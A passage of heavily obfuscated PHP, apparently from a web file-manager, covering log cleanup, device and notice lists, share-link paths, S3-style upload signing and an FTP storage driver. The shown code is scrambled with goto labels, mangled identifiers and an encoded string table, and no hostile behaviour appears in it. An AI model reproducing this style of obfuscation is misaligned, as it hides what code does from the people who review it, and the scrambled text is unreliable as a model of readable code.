$_SERVER[òÀöí]; $eİŒÜŞˆ’ = array_to_keyvalue($ešÎ…„…ê, $A‰™ÖÚôĞø[33], $A‰™ÖÚôĞø[1504]); $f…áô£ï‚í = Model($A‰™ÖÚôĞø[495])->userListInfo(array_unique($eİŒÜŞˆ’)); goto BŒ“Çñ­¶Ï; Dø–ÇÇå—Ğ: return $EÌ‚Œ²ÏŸÔ; goto D’”ö‰‹ƒÓ; FÊŒˆãÕ‡¼: $AÑ¬‘ÎáĞ = array(); foreach ($ešÎ…„…ê as $fï†–“Ñ§ => $B‡—š±Ô©Ü) { goto C¹İ«Ó’»‹; AèŒ“¨–: $B‡—š±Ô©Ü[$A‰™ÖÚôĞø[28]] = isset($f¨Úñˆ˜Ó¦[$A‰™ÖÚôĞø[28]]) ? $f¨Úñˆ˜Ó¦[$A‰™ÖÚôĞø[28]] : LNG($A‰™ÖÚôĞø[2056]); $B‡—š±Ô©Ü[$A‰™ÖÚôĞø[1927]] = isset($f¨Úñˆ˜Ó¦[$A‰™ÖÚôĞø[1927]]) ? $f¨Úñˆ˜Ó¦[$A‰™ÖÚôĞø[1927]] : $A‰™ÖÚôĞø[33]; $B‡—š±Ô©Ü[$A‰™ÖÚôĞø[1409]] = isset($DÇë¸íæ®¡[$AŒòÙ¡Ù]) ? $DÇë¸íæ®¡[$AŒòÙ¡Ù] : $BÑ‡ˆ¬ÌĞ¿; goto fƒ…¬µ±ÙÃ; C¹İ«Ó’»‹: $AŒòÙ¡Ù = $B‡—š±Ô©Ü[$A‰™ÖÚôĞø[29]]; $f¨Úñˆ˜Ó¦ = isset($f…áô£ï‚í[$B‡—š±Ô©Ü[$A‰™ÖÚôĞø[1504]]]) ? $f…áô£ï‚í[$B‡—š±Ô©Ü[$A‰™ÖÚôĞø[1504]]] : !1; $BÑ‡ˆ¬ÌĞ¿ = strpos($AŒòÙ¡Ù, $A‰™ÖÚôĞø[2060]) === 0 ? LNG($A‰™ÖÚôĞø[2061]) : LNG($A‰™ÖÚôĞø[2056]); goto AèŒ“¨–; fâä‡Ú¾Í‚: $this->ipAddress($B‡—š±Ô©Ü); if (strpos($AŒòÙ¡Ù, $A‰™ÖÚôĞø[1878]) === 0 || isset($A“Ë½•©[$A‰™ÖÚôĞø[1877]])) { goto C·ÏÁ¦®—; C·ÏÁ¦®—: $A“Ë½•©[$A‰™ÖÚôĞø[84]] = $E®  ¢‘˜[$A“Ë½•©[$A‰™ÖÚôĞø[387]]]; $A“Ë½•©[$A‰™ÖÚôĞø[1890]] = $E®  ¢‘˜[$A“Ë½•©[$A‰™ÖÚôĞø[1877]]]; if ($A“Ë½•©[$A‰™ÖÚôĞø[29]] == $A‰™ÖÚôĞø[509]) { $A“Ë½•©[$A‰™ÖÚôĞø[422]][$A‰™ÖÚôĞø[1033]] = $E®  ¢‘˜[$A“Ë½•©[$A‰™ÖÚôĞø[422]][$A‰™ÖÚôĞø[1033]]]; $A“Ë½•©[$A‰™ÖÚôĞø[422]][$A‰™ÖÚôĞø[1034]] = $E®  ¢‘˜[$A“Ë½•©[$A‰™ÖÚôĞø[422]][$A‰™ÖÚôĞø[1034]]]; } goto FÔÃ´œù„; FÈ¶ÄÎâš‘: if ($A“Ë½•©[$A‰™ÖÚôĞø[1890]] && $A“Ë½•©[$A‰™ÖÚôĞø[1890]][$A‰™ÖÚôĞø[389]] == $A‰™ÖÚôĞø[1145]) { $AÑ¬‘ÎáĞ[] = $B‡—š±Ô©Ü[$A‰™ÖÚôĞø[385]]; unset($ešÎ…„…ê[$fï†–“Ñ§]); continue; } goto AÜÑ³ÓÓÔù; FÔÃ´œù„: if ($A“Ë½•©[$A‰™ÖÚôĞø[29]] == $A‰™ÖÚôĞø[1885]) { $A“Ë½•©[$A‰™ÖÚôĞø[422]][$A‰™ÖÚôĞø[387]] = $E®  ¢‘˜[$A“Ë½•©[$A‰™ÖÚôĞø[422]][$A‰™ÖÚôĞø[387]]]; } if ($A“Ë½•©[$A‰™ÖÚôĞø[29]] == $A‰™ÖÚôĞø[1629]) { $A“Ë½•©[$A‰™ÖÚôĞø[1890]] = $A“Ë½•©[$A‰™ÖÚôĞø[84]]; $A“Ë½•©[$A‰™ÖÚôĞø[1877]] = $A“Ë½•©[$A‰™ÖÚôĞø[1890]][$A‰™ÖÚôĞø[387]]; $A“Ë½•©[$A‰™ÖÚôĞø[84]] = !1; $A“Ë½•©[$A‰™ÖÚôĞø[387]] = $A‰™ÖÚôĞø[33]; } if ($A“Ë½•©[$A‰™ÖÚôĞø[84]] && $A“Ë½•©[$A‰™ÖÚôĞø[84]][$A‰™ÖÚôĞø[389]] == $A‰™ÖÚôĞø[1145]) { $AÑ¬‘ÎáĞ[] = $B‡—š±Ô©Ü[$A‰™ÖÚôĞø[385]]; unset($ešÎ…„…ê[$fï†–“Ñ§]); continue; } goto FÈ¶ÄÎâš‘; AÜÑ³ÓÓÔù: } $B‡—š±Ô©Ü[$A‰™ÖÚôĞø[422]] = $A“Ë½•©; goto E ù£©ÅÖÉ; fƒ…¬µ±ÙÃ: $B‡—š±Ô©Ü[$A‰™ÖÚôĞø[1821]] = $f¨Úñˆ˜Ó¦; $A“Ë½•© = json_decode($B‡—š±Ô©Ü[$A‰™ÖÚôĞø[422]], !0); $B‡—š±Ô©Ü[$A‰™ÖÚôĞø[2055]] = isset($A“Ë½•©[$A‰™ÖÚôĞø[2055]]) ? $A“Ë½•©[$A‰™ÖÚôĞø[2055]] : $A‰™ÖÚôĞø[33]; goto fâä‡Ú¾Í‚; E ù£©ÅÖÉ: unset($B‡—š±Ô©Ü[$A‰™ÖÚôĞø[2062]]); $EÌ‚Œ²ÏŸÔ[] = $B‡—š±Ô©Ü; goto F½‰ïŠ¥­; F½‰ïŠ¥­: } $this->clearSystemPathLog($AÑ¬‘ÎáĞ); goto Dø–ÇÇå—Ğ; D’”ö‰‹ƒÓ: } private function clearSystemPathLog($f¬Î³¨Â) { $Fœõ§±’¹Ó =& $_SERVER[òÀöí]; if (count($f¬Î³¨Â) == 0) { return; } $a²³›£’² = array($Fœõ§±’¹Ó[385] => array($Fœõ§±’¹Ó[7], array_unique($f¬Î³¨Â))); $this->where($a²³›£’²)->delete(); } public function deviceList($cé™©°ÖØŞ, $aŒí—åé¹Õ = 0) { $bÈë¢¼¦Æ =& $_SERVER[òÀöí]; $Bİ…ñŠÜ›õ = array($bÈë¢¼¦Æ[1504] => $cé™©°ÖØŞ, $bÈë¢¼¦Æ[192] => array($bÈë¢¼¦Æ[950], $aŒí—åé¹Õ), $bÈë¢¼¦Æ[29] => $bÈë¢¼¦Æ[1602]); $E°ù„£óÈÛ = array(); $dÁì¨÷„İ = $this->field($bÈë¢¼¦Æ[2063])->where($Bİ…ñŠÜ›õ)->order($bÈë¢¼¦Æ[1888])->limit(50)->select(); foreach ($dÁì¨÷„İ as $dÉ’§åŠ¹Ì => $CÓ›ø‰¹Éù) { goto fÀµ‹ˆŠñ; dÌÉ Å£Äó: $this->ipAddress($CÓ›ø‰¹Éù); $CÓ›ø‰¹Éù[$bÈë¢¼¦Æ[422]] = $a¼·‡·Âìí; $E°ù„£óÈÛ[$c‰ï°íÁïŒ] = $CÓ›ø‰¹Éù; goto D‰Ô‰äÚ˜°; B—Ó÷µ–èè: unset($a¼·‡·Âìí[$bÈë¢¼¦Æ[2055]]); $c‰ï°íÁïŒ = $this->deviceType($a¼·‡·Âìí[$bÈë¢¼¦Æ[1879]]); if (isset($E°ù„£óÈÛ[$c‰ï°íÁïŒ])) { continue; } goto dÌÉ Å£Äó; fÀµ‹ˆŠñ: if ($dÉ’§åŠ¹Ì > 0 && abs($CÓ›ø‰¹Éù[$bÈë¢¼¦Æ[192]] - $dÁì¨÷„İ[$dÉ’§åŠ¹Ì - 1][$bÈë¢¼¦Æ[192]]) < 5) { continue; } $a¼·‡·Âìí = json_decode($CÓ›ø‰¹Éù[$bÈë¢¼¦Æ[422]], !0); $CÓ›ø‰¹Éù[$bÈë¢¼¦Æ[2055]] = isset($a¼·‡·Âìí[$bÈë¢¼¦Æ[2055]]) ? $a¼·‡·Âìí[$bÈë¢¼¦Æ[2055]] : $bÈë¢¼¦Æ[33]; goto B—Ó÷µ–èè; D‰Ô‰äÚ˜°: } return array_values($E°ù„£óÈÛ); } public function deviceType($E¬ÆÍÉ÷Ş) { return $E¬ÆÍÉ÷Ş; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x6e\157\164\151\x63\x65\114\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\143\x6f\x6e\164\x65\156\164", "\x61\165\164\150", "\x6d\157\x64\x65", "\164\151\x6d\145", "\x74\171\160\x65", "\x6c\145\166\x65\x6c", "\x65\x6e\x61\x62\x6c\x65", "\x73\x6f\x72\164"); public function listData($b“¬Í§§— = false, $EÕñêèÓÑ” = "\163\x6f\162\x74", $cöò¡ƒğîÑ = false) { return parent::listData($b“¬Í§§—, $EÕñêèÓÑ”, $cöò¡ƒğîÑ); } public function add($cˆ´«‰ƒà„) { $a£áˆÇçË =& $_SERVER[òÀöí]; $E…ò­äÄß = time(); if ($cˆ´«‰ƒà„[$a£áˆÇçË[12]] == $a£áˆÇçË[2064]) { $E…ò­äÄß = strtotime($cˆ´«‰ƒà„[$a£áˆÇçË[195]]); } $cˆ´«‰ƒà„[$a£áˆÇçË[195]] = $E…ò­äÄß; return parent::insert($cˆ´«‰ƒà„); } public function update($AÏõ·§¢ç°, $bĞ‹í£·) { goto C˜„ê—Àá®; F´øÕÅÇËë: $F¿È×˜Œù = time(); if ($bĞ‹í£·[$d±ìŞîÌ[12]] == $d±ìŞîÌ[2064]) { $F¿È×˜Œù = strtotime($bĞ‹í£·[$d±ìŞîÌ[195]]); } $bĞ‹í£·[$d±ìŞîÌ[195]] = $F¿È×˜Œù; goto A”¦µ‡Ú¶; C˜„ê—Àá®: $d±ìŞîÌ =& $_SERVER[òÀöí]; $A³Èàèµ¤Ï = $this->listData($AÏõ·§¢ç°); if (!$A³Èàèµ¤Ï) { return !1; } goto F´øÕÅÇËë; A”¦µ‡Ú¶: return parent::update($AÏõ·§¢ç°, $bĞ‹í£·); goto Dœ­Ç¡¡‘—; Dœ­Ç¡¡‘—: } public function remove($EĞ´È¾Ÿ¤) { $BŠÀÖğ”ßê = $this->listData($EĞ´È¾Ÿ¤); if (!$BŠÀÖğ”ßê || $BŠÀÖğ”ßê[$_SERVER[òÀöí][1145]]) { return !1; } return parent::remove($EĞ´È¾Ÿ¤); } public function sort($f‡µ„ˆÔ¤, $d¸Ğ‡èÎÃÀ) { return parent::update($f‡µ„ˆÔ¤, $d¸Ğ‡èÎÃÀ); } public function enable($e°Œ…â¸Î¼, $aÏ°æõ³¥Ÿ) { return parent::update($e°Œ…â¸Î¼, array($_SERVER[òÀöí][2065] => $aÏ°æõ³¥Ÿ)); } private function initUserOption() { $eÏ·êª‹ =& $_SERVER[òÀöí]; $this->optionType = $eÏ·êª‹[2066]; $this->modelType = $eÏ·êª‹[2067]; $this->field = array($eÏ·êª‹[2068], $eÏ·êª‹[28], $eÏ·êª‹[195], $eÏ·êª‹[29], $eÏ·êª‹[2069], $eÏ·êª‹[708], $eÏ·êª‹[189]); } public function userNoticeGet($B‚ªæ­õÒ« = false) { $this->initUserOption(); return parent::listData($B‚ªæ­õÒ«, $_SERVER[òÀöí][385], !0); } public function userNoticeAdd($C†§ÀÉÃáİ) { $BÔ´ÖÒÈ´Î =& $_SERVER[òÀöí]; $this->initUserOption(); $dÛñõê¹–’ = $this->findByKey($BÔ´ÖÒÈ´Î[2068], $C†§ÀÉÃáİ[$BÔ´ÖÒÈ´Î[385]]); if ($dÛñõê¹–’) { return !0; } $a‡‘Úô›¦ = array($BÔ´ÖÒÈ´Î[2068] => $C†§ÀÉÃáİ[$BÔ´ÖÒÈ´Î[385]], $BÔ´ÖÒÈ´Î[28] => $C†§ÀÉÃáİ[$BÔ´ÖÒÈ´Î[28]], $BÔ´ÖÒÈ´Î[195] => $C†§ÀÉÃáİ[$BÔ´ÖÒÈ´Î[195]], $BÔ´ÖÒÈ´Î[29] => isset($C†§ÀÉÃáİ[$BÔ´ÖÒÈ´Î[29]]) ? $C†§ÀÉÃáİ[$BÔ´ÖÒÈ´Î[29]] : 1, $BÔ´ÖÒÈ´Î[2069] => isset($C†§ÀÉÃáİ[$BÔ´ÖÒÈ´Î[2069]]) ? $C†§ÀÉÃáİ[$BÔ´ÖÒÈ´Î[2069]] : 0, $BÔ´ÖÒÈ´Î[708] => 0, $BÔ´ÖÒÈ´Î[189] => 0); return parent::insert($a‡‘Úô›¦); } public function userNoticeEdit($A…Ë£„³†Ë, $f³¯¶†¥ø) { $this->initUserOption(); return parent::update($A…Ë£„³†Ë, $f³¯¶†¥ø); } } goto b‘´«Ôè£‘; F¾Ş¬±èÙ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($bŒóù¥Æ¸) { $this->pathParse = $bŒóù¥Æ¸; } protected function infoParse($CáÏ«Ü³›, $f­°‡´‹± = false) { $d¨ÇÑ¸ÛĞ =& $_SERVER[òÀöí]; return Action($d¨ÇÑ¸ÛĞ[1048])->sharePathInfo($this->pathParse[$d¨ÇÑ¸ÛĞ[75]], !0, $f­°‡´‹±); } public function listPath($D›ˆ†¶“ä, $a­’²„ÜÏÖ = false) { $EáŸœ­®¾ =& $_SERVER[òÀöí]; $fÜ÷œ‹Ó‘Ï = IO::listPath($D›ˆ†¶“ä, $a­’²„ÜÏÖ); foreach ($fÜ÷œ‹Ó‘Ï as $fæ¿¸‹¢ ì => $e½ß˜Ğ­Ò) { if (!in_array($fæ¿¸‹¢ ì, array($EáŸœ­®¾[73], $EáŸœ­®¾[74]))) { continue; } foreach ($e½ß˜Ğ­Ò as $fÔ® ŞÇ±‹ => $Aºƒ±ô¿™Ñ) { $Aºƒ±ô¿™Ñ = Action($EáŸœ­®¾[1197])->parsePathChildren($Aºƒ±ô¿™Ñ, array($EáŸœ­®¾[405] => $D›ˆ†¶“ä)); $fÜ÷œ‹Ó‘Ï[$fæ¿¸‹¢ ì][$fÔ® ŞÇ±‹] = Action($EáŸœ­®¾[1048])->shareItemInfo($Aºƒ±ô¿™Ñ); } } return $fÜ÷œ‹Ó‘Ï; } public function listAll($A’µØÂï) { $Aªâ´ò«Õ =& $_SERVER[òÀöí]; $cÖö¥å¬¼• = IO::listAll($A’µØÂï); foreach ($cÖö¥å¬¼• as &$Fô³¿ãÕâ) { $Fô³¿ãÕâ = array_merge(IO::info($Fô³¿ãÕâ[$Aªâ´ò«Õ[75]]), $Fô³¿ãÕâ); $Fô³¿ãÕâ[$Aªâ´ò«Õ[84]] = Action($Aªâ´ò«Õ[1048])->shareItemInfo($Fô³¿ãÕâ); } unset($Fô³¿ãÕâ); return $cÖö¥å¬¼•; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($E¡òØÈğƒŠ) { parent::__construct($E¡òØÈğƒŠ); $this->signatureVersion($_SERVER[òÀöí][210]); } public function uploadFormData($DŒ•ï¾å ¢, $D¨ß ÀÌ÷— = 3600) { goto D«Çù‘ğº´; EæËŒ³½˜©: $e‰¾è´ê„ = array($BéïÆ‘õå[209] => $BéïÆ‘õå[33], $BéïÆ‘õå[1210] => $BéïÆ‘õå[33], $BéïÆ‘õå[1168] => $d…ãí­Ü®Ê, $BéïÆ‘õå[1172] => $a¢Œ‡İİå, $BéïÆ‘õå[1176] => $eŞµËõ¹®ë, $BéïÆ‘õå[1211] => $EÊµ¬È”ßø, $BéïÆ‘õå[1212] => $eĞ¢Øñ¨…Ö, $BéïÆ‘õå[1213] => $A®Îìƒ®ß, $BéïÆ‘õå[1214] => $EİçÇ©ò¾ï, $BéïÆ‘õå[1215] => $EìöÔŸàÅ, $BéïÆ‘õå[175] => $this->getHost()); return $e‰¾è´ê„; goto EÖ¯ˆŠ·Ì÷; cÜÔÕ×ˆº¦: $eŞµËõ¹®ë = base64_encode(json_encode($e¦©ñ§‡¿)); $cĞ­Ü£Šå = hash_hmac($BéïÆ‘õå[1208], $a“Ë‰‘“ƒ¥, $BéïÆ‘õå[1209] . $this->secret, !0); $d…äÜ’· = hash_hmac($BéïÆ‘õå[1208], $this->region, $cĞ­Ü£Šå, !0); goto aÃÆİî†; FÂï‡ö‘åª: $DìÜâßİŞ = array($this->accessKey, $a“Ë‰‘“ƒ¥, $this->region, $bÙïùé¾ó«, $CƒšÙ à…Ê); $EÊµ¬È”ßø = implode($BéïÆ‘õå[8], $DìÜâßİŞ); $e¦©ñ§‡¿ = array($BéïÆ‘õå[1166] => gmdate($BéïÆ‘õå[1165], strtotime($BéïÆ‘õå[1201])), $BéïÆ‘õå[1167] => array(array($BéïÆ‘õå[1169] => $this->bucket), array($BéïÆ‘õå[1168] => $d…ãí­Ü®Ê), array($BéïÆ‘õå[1170], $BéïÆ‘õå[1171], $BéïÆ‘õå[33]), array($BéïÆ‘õå[1170], $BéïÆ‘õå[1202], $BéïÆ‘õå[33]), array($BéïÆ‘õå[1170], $BéïÆ‘õå[1203], $BéïÆ‘õå[33]), array($BéïÆ‘õå[1172] => $a¢Œ‡İİå), array($BéïÆ‘õå[1204] => $EÊµ¬È”ßø), array($BéïÆ‘õå[1205] => $eĞ¢Øñ¨…Ö), array($BéïÆ‘õå[1206] => $A®Îìƒ®ß), array($BéïÆ‘õå[1207] => $EİçÇ©ò¾ï))); goto cÜÔÕ×ˆº¦; aÃÆİî†: $eÚ·¼¤ÎØœ = hash_hmac($BéïÆ‘õå[1208], $bÙïùé¾ó«, $d…äÜ’·, !0); $aöÕÜÜÂÌ¥ = hash_hmac($BéïÆ‘õå[1208], $CƒšÙ à…Ê, $eÚ·¼¤ÎØœ, !0); $EìöÔŸàÅ = hash_hmac($BéïÆ‘õå[1208], $eŞµËõ¹®ë, $aöÕÜÜÂÌ¥); goto EæËŒ³½˜©; D«Çù‘ğº´: $BéïÆ‘õå =& $_SERVER[òÀöí]; $d…ãí­Ü®Ê = $BéïÆ‘õå[191]; $eĞ¢Øñ¨…Ö = $BéïÆ‘õå[1198]; goto c°™ãƒ®—; c°™ãƒ®—: $bÙïùé¾ó« = $BéïÆ‘õå[59]; $A®Îìƒ®ß = gmdate($BéïÆ‘õå[1199]); $a“Ë‰‘“ƒ¥ = gmdate($BéïÆ‘õå[709]); goto BÏŠßŠò…­; BÏŠßŠò…­: $CƒšÙ à…Ê = $BéïÆ‘õå[1200]; $EİçÇ©ò¾ï = $D¨ß ÀÌ÷— . $BéïÆ‘õå[33]; $a¢Œ‡İİå = $BéïÆ‘õå[1164]; goto FÂï‡ö‘åª; EÖ¯ˆŠ·Ì÷: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($aÆÃŠƒßŒ´) { parent::__construct(); if (count($aÆÃŠƒßŒ´) > 0) { $this->_init($aÆÃŠƒßŒ´); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($e†ö¥Â¥Î¢) { $Cè˜ªºÃØ =& $_SERVER[òÀöí]; global $config; $this->appCharset = $config[$Cè˜ªºÃØ[1216]]; $this->systemCharset = $config[$Cè˜ªºÃØ[1217]]; if (isset($e†ö¥Â¥Î¢[$Cè˜ªºÃØ[1218]]) && $e†ö¥Â¥Î¢[$Cè˜ªºÃØ[1218]]) { $this->systemCharset = $e†ö¥Â¥Î¢[$Cè˜ªºÃØ[1218]]; } } public function iconvApp($dÕ åÌëÛä) { return $this->iconvTo($dÕ åÌëÛä, $this->systemCharset, $this->appCharset); } public function iconvSystem($EòœŒ®— ) { return $this->iconvTo($EòœŒ®— , $this->appCharset, $this->systemCharset); } public function getPathOuter($EºĞ›ê”æ) { goto fí‚†ñÓØ; fí‚†ñÓØ: $e‹¾ßÒá¢¡ =& $_SERVER[òÀöí]; $D©®é‡ç‰ˆ = $this->iconvApp($this->pathBase); $EºĞ›ê”æ = $this->iconvApp($EºĞ›ê”æ); goto F£óÀ ®ïˆ; F£óÀ ®ïˆ: if (substr($D©®é‡ç‰ˆ, 0, 2) == $e‹¾ßÒá¢¡[1219]) { $D©®é‡ç‰ˆ = BASIC_PATH . substr($D©®é‡ç‰ˆ, 2); } if (substr($EºĞ›ê”æ, 0, 2) == $e‹¾ßÒá¢¡[1219]) { $EºĞ›ê”æ = BASIC_PATH . substr($EºĞ›ê”æ, 2); } $D©®é‡ç‰ˆ = KodIO::clear($D©®é‡ç‰ˆ); goto F…¦×†³œ’; F…¦×†³œ’: $EºĞ›ê”æ = KodIO::clear($EºĞ›ê”æ); $EºĞ›ê”æ = substr($EºĞ›ê”æ, strlen($D©®é‡ç‰ˆ)); if (empty($this->pathDriver)) { return $EºĞ›ê”æ; } goto e©´«‹¤©Ğ; e©´«‹¤©Ğ: return $this->pathDriver . $e‹¾ßÒá¢¡[8] . ltrim($EºĞ›ê”æ, $e‹¾ßÒá¢¡[8]); goto A¨©ˆÄ’¦™; A¨©ˆÄ’¦™: } private function _init($C¯ ‘ñĞø = array()) { $c×ÎÓĞïŞ¯ =& $_SERVER[òÀöí]; if (!function_exists($c×ÎÓĞïŞ¯[1220])) { throw new Exception(LNG($c×ÎÓĞïŞ¯[1221])); } $this->config = $C¯ ‘ñĞø; $this->charsetReset($C¯ ‘ñĞø); foreach ($C¯ ‘ñĞø as $b¹Èµî˜öñ => $F’İ„˜÷Ğ) { if (isset($this->{$b¹Èµî˜öñ})) { $this->{$b¹Èµî˜öñ} = $F’İ„˜÷Ğ; } } return $this->_login($C¯ ‘ñĞø); } private function _login($bŒ¯‹™¨×Ú) { goto f­¸Ûè°í‚; eÍœóšóí: $e÷Ñ¡®³’È[$DÍ¿·™ëµ] = array($Cò¤Ûíó±[1225] => $this->connect, $Cò¤Ûíó±[175] => $this->host, $Cò¤Ûíó±[174] => $this->scheme, $Cò¤Ûíó±[176] => $this->port); return $CØî¶œŠÌ; goto a¹Î”“œ ã; f­¸Ûè°í‚: $Cò¤Ûíó± =& $_SERVER[òÀöí]; static $e÷Ñ¡®³’È = array(); $DÍ¿·™ëµ = md5(json_encode($bŒ¯‹™¨×Ú)); goto BÛì²¢Íã¦; A’„Ø™™“À: $E­šªÄÌÇ¹ = isset($b°º«²ñ [$Cò¤Ûíó±[174]]) && $b°º«²ñ [$Cò¤Ûíó±[174]] == $Cò¤Ûíó±[1222] ? !0 : !1; $this->scheme = $E­šªÄÌÇ¹ ? $Cò¤Ûíó±[1223] : $Cò¤Ûíó±[1224]; $this->port = isset($b°º«²ñ [$Cò¤Ûíó±[176]]) ? $b°º«²ñ [$Cò¤Ûíó±[176]] : 21; goto dîÊ…êÏ¬; dç””‡¹Å: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $aÉùÜÅİÇ = $this->pasv == $Cò¤Ûíó±[86] ? !0 : !1; @ftp_pasv($this->connect, $aÉùÜÅİÇ); goto eÍœóšóí; BÛì²¢Íã¦: if (isset($e÷Ñ¡®³’È[$DÍ¿·™ëµ])) { foreach ($e÷Ñ¡®³’È[$DÍ¿·™ëµ] as $bŒé¹Ê³ÕÔ => $Fƒ¼Å´ø¸ˆ) { $this->{$bŒé¹Ê³ÕÔ} = $Fƒ¼Å´ø¸ˆ; } return !0; } $b°º«²ñ  = parse_url(trim($this->server, $Cò¤Ûíó±[8])); $this->host = $b°º«²ñ [$Cò¤Ûíó±[175]]; goto A’„Ø™™“À; dîÊ…êÏ¬: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $CØî¶œŠÌ = @ftp_login($this->connect, $this->username, $this->userpass); goto dç””‡¹Å; a¹Î”“œ ã: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($a åÔí‡ËÜ, $FŸÅôõ‰°– = '', $fÍ»Çœ‘ˆ = REPEAT_RENAME) { if ($this->setContent($a åÔí‡ËÜ, $FŸÅôõ‰°–)) { return $this->getPathOuter($a åÔí‡ËÜ); } return !1; } public function mkdir($C·ñÜ¥®, $Dœ˜ Æ†Şì = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $C·ñÜ¥® = $this->iconvSystem($C·ñÜ¥®); if ($this->_isFolder($C·ñÜ¥®) || @ftp_mkdir($this->connect, $C·ñÜ¥®)) { return $this->getPathOuter($C·ñÜ¥®); } if (!$this->mkdir($this->pathFather($C·ñÜ¥®))) { return !1; } if ($C·ñÜ¥® = @ftp_mkdir($this->connect, $C·ñÜ¥®)) { return $this->getPathOuter($C·ñÜ¥®); } return !1; } public function copyFile($bº•½ä§¥, $AÌŞ‰Éë§ ) { goto FÕÆ¢ö÷ƒÌ; FÕÆ¢ö÷ƒÌ: if (!$this->_isconn()) { return !1; } $aù­Ä·İÉ = $this->pathThis($this->iconvSystem($bº•½ä§¥)); $d×‘ İ—Óğ = $this->tempFile($aù­Ä·İÉ); goto b¨¼¿“éŠ„; FÂŒ©†ÏÑä: $this->tempFileRemve($d×‘ İ—Óğ); return $c…›İâ¾»; goto aôñ×·§Ø; b¨¼¿“éŠ„: $C³ºõ¦–À‘ = $this->iconvApp($d×‘ İ—Óğ); $this->download($bº•½ä§¥, $C³ºõ¦–À‘); $c…›İâ¾» = $this->upload($AÌŞ‰Éë§ , $C³ºõ¦–À‘); goto FÂŒ©†ÏÑä; aôñ×·§Ø: } public function moveFile($A›‚éæ©å, $aƒè•‘Ñğç) { if (!$this->_isconn()) { return !1; } $A›‚éæ©å = $this->iconvSystem($A›‚éæ©å); $aƒè•‘Ñğç = $this->iconvSystem($aƒè•‘Ñğç); $f‚Ÿ·¨ÏùË = @ftp_rename($this->connect, $A›‚éæ©å, $aƒè•‘Ñğç); return $f‚Ÿ·¨ÏùË ? $this->getPathOuter($aƒè•‘Ñğç) : !1; } public function delFile($cÓÉ ¦ƒá‚) { if (!$this->_isconn()) { return !1; } $cÓÉ ¦ƒá‚ = $this->iconvSystem($cÓÉ ¦ƒá‚); return @ftp_delete($this->connect, $cÓÉ ¦ƒá‚); } public function delFolder($dğ‚¤¤ùÔ) { goto d±á»´¬ƒ’; D”ÌÅòˆù: $this->fileList($dğ‚¤¤ùÔ, $b›ˆ±¦¼„Ø, $E—Õ›¼ªŸï, !0); $this->listItemCache = !0; foreach ($E—Õ›¼ªŸï as $cÂˆİ¤¾Üé) { $c …å‘øÍä = $this->iconvSystem($cÂˆİ¤¾Üé[$_SERVER[òÀöí][28]]); $dÙŞÑÖ¼ø = @ftp_delete($this->connect, $c …å‘øÍä); if (!$dÙŞÑÖ¼ø) { return !1; } } goto C¢»ï£–ëÕ; C¢»ï£–ëÕ: foreach ($b›ˆ±¦¼„Ø as $c …å‘øÍä) { $c …å‘øÍä = $this->iconvSystem($c …å‘øÍä); $dÙŞÑÖ¼ø = @ftp_rmdir($this->connect, $c …å‘øÍä); if (!$dÙŞÑÖ¼ø) { return !1; } } $dğ‚¤¤ùÔ = $this->iconvSystem($dğ‚¤¤ùÔ); return @ftp_rmdir($this->connect, $dğ‚¤¤ùÔ); goto CâôÀÅõÂÏ; d±á»´¬ƒ’: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $b›ˆ±¦¼„Ø = $E—Õ›¼ªŸï = array(); goto D”ÌÅòˆù; CâôÀÅõÂÏ: } public function rename($E±Ê•éâ“ğ, $C¦åÚÚŒó¹) { goto c¿Ôß”‰â; c¿Ôß”‰â: $F„¢Â…àÒ =& $_SERVER[òÀöí]; if (!$this->_isconn()) { return !1; } $Cİ„ÖÄÉ = $this->fileNameAuto($this->pathFather($E±Ê•éâ“ğ), $C¦åÚÚŒó¹); goto B¯™‹ğ‰Ü; B¯™‹ğ‰Ü: $Cİ„ÖÄÉ = $this->iconvSystem($Cİ„ÖÄÉ); $E±Ê•éâ“ğ = $this->iconvSystem($E±Ê•éâ“ğ); $A—æ¥àœ¿ = $this->pathFather($E±Ê•éâ“ğ); goto bä––¯èÈ†; bä––¯èÈ†: $eµÏŒÏ¤Å¨ = rtrim($A—æ¥àœ¿, $F„¢Â…àÒ[8]) . $F„¢Â…àÒ[8] . $Cİ„ÖÄÉ; $eÊ—¶Ëí = @ftp_rename($this->connect, $E±Ê•éâ“ğ, $eµÏŒÏ¤Å¨); $eµÏŒÏ¤Å¨ = $this->iconvApp($eµÏŒÏ¤Å¨); goto CÅËÃÙ‹; CÅËÃÙ‹: return $eÊ—¶Ëí ? $this->getPathOuter($eµÏŒÏ¤Å¨) : !1; goto dŒ‘­Şóã„; dŒ‘­Şóã„: } private function folderInfo($ešÏˆĞÈ°¿, $B‚§Îƒ‹Š‡ = false) { $Bˆ×ÆËô´ =& $_SERVER[òÀöí]; $dß¬µ¡‘‚Ã = array($Bˆ×ÆËô´[28] => $this->pathThis($ešÏˆĞÈ°¿), $Bˆ×ÆËô´[75] => $this->getPathOuter($Bˆ×ÆËô´[8] . $ešÏˆĞÈ°¿), $Bˆ×ÆËô´[29] => $Bˆ×ÆËô´[76]); if ($B‚§Îƒ‹Š‡) { return $dß¬µ¡‘‚Ã; } $dß¬µ¡‘‚Ã[$Bˆ×ÆËô´[192]] = $dß¬µ¡‘‚Ã[$Bˆ×ÆËô´[83]] = 0; $dß¬µ¡‘‚Ã[$Bˆ×ÆËô´[193]] = $dß¬µ¡‘‚Ã[$Bˆ×ÆËô´[194]] = !0; return $dß¬µ¡‘‚Ã; } private function fileInfo($C¹§ƒóì²„, $aîåÏ§Ã¹„ = false, $EÏ»Ìµºù´ = array()) { goto DÛ…àğ¿»’; dé¬¯ÉÏâÙ: return $Aõ†ËÜòë¶; goto aæ¦à¢ˆ¸È; a†ÜË´†õ: 